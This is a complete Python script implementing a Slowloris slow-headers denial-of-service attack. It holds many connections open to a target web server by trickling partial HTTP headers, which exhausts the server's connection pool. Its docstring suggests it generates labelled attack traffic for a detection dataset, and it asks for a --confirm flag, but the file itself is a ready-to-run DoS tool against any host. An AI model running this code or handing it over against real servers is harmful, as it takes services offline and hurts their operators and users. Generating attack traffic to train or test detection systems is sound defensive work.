#!/usr/bin/env python3
"""Slowloris slow-headers DoS generator — pure Python, cross-platform.

Runs anywhere with Python 3 (incl. Windows / Git Bash), so it covers the
Slowloris class without needing the `slowhttptest` binary. Run from the ATTACKER
host; pair with capture.sh on the VPS. Label when capturing: "DoS attacks-Slowloris".

Opens many connections and trickles partial headers to exhaust the server's
connection pool. MEDIUM-HIGH impact — keep short, hosts you own only.

Usage:
  python slowloris.py <host> [--port 443] [--no-tls] [--sockets 400] [--duration 60] --confirm
"""
import argparse
import random
import socket
import ssl
import sys
import time

_UA = ["Mozilla/5.0 (Windows NT 10.0)", "Mozilla/5.0 (X11; Linux x86_64)",
       "Chrome/120.0", "Safari/16.0"]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--no-tls", action="store_true", help="plain HTTP (default TLS)")
    ap.add_argument("--sockets", type=int, default=400)
    ap.add_argument("--duration", type=int, default=60)
    ap.add_argument("--confirm", action="store_true", help="required (DoS vs live box)")
    a = ap.parse_args()
    if not a.confirm:
        print("Refusing: pass --confirm (this is a DoS against a live box)")
        return 1

    use_tls = not a.no_tls
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def new_sock():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((a.host, a.port))
        if use_tls:
            s = ctx.wrap_socket(s, server_hostname=a.host)
        s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {a.host}\r\n".encode())
        s.send(f"User-Agent: {random.choice(_UA)}\r\n".encode())
        s.send(b"Accept-language: en-US,en\r\n")
        return s

    print(f"slowloris {a.host}:{a.port} tls={use_tls} sockets={a.sockets} dur={a.duration}s")
    socks = []
    for _ in range(a.sockets):
        try:
            socks.append(new_sock())
        except Exception:
            pass
    end = time.time() + a.duration
    while time.time() < end:
        for s in list(socks):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except Exception:
                try:
                    socks.remove(s)
                except ValueError:
                    pass
                try:
                    socks.append(new_sock())
                except Exception:
                    pass
        print(f"  keeping {len(socks)} sockets alive   ", end="\r")
        time.sleep(10)
    for s in socks:
        try:
            s.close()
        except Exception:
            pass
    print("\ndone")
    return 0


if __name__ == "__main__":
    sys.exit(main())
